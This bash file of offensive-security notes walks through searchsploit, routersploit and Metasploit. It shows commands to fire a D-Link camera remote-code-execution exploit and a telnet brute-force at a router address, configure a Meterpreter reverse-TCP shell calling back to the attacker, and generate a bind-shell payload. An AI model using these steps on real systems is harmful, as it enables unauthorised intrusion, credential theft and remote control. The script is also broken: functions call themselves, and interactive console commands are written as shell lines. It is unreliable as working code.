#!/bin/bash

# hunting for vulnerabilities
function burp {
  burp
}


function WebApp-Vega()  {
  sudo apt-get install vega
  vega
}

function searchsploit-exploitdb() {
  #search exploitdb
  searchsploit -h
  # exploit into our working directory
  searchsploit -m <keyword>
  # exploits:  - publically available exploits
  # creds:     - different devices
  # scanners:  - checking a particular exploit against a particular device
}

function routersploit() {
  git clone https://github.com/reverse-shell/routersploit
  cd routersploit
  ./rsf.py
  # it starts "rsf >"
  
  use exploits/dlink/dcs_930l_auth_rce
  show options
  set target 192.168.1.1
  # to exploit type run
  run

  use scanners/cisco_scan
  show options
  set target 192.168.1.1

  use creds/telnet_bruteforce
  show options
  set target 192.168.1.1
  run
}

function msfconsole() {
  # Metasploit Framework
  msfconsole
  search exploit_name
  use exploits/path/to/exploit
  show options
  set RHOST <target.ip>
  set payload windows/meterpreter/reverse_tcp
  set lhost <our.machine>
  set lport <our.port>
  exploit
}
function msfpayload() {
  # https://www.offensive-security.com/metasploit-unleashed/msfpayload/
  msfpayload -l
  # gives info
  msfpayload windows/shell_bind_tcp 0
  # changing exit technique and listening port
  # output type as C, Perl, Raw, 
  msfpayload windows/shell_bind_tcp EXITFUNC=seh LPORT=1234 0 C
}


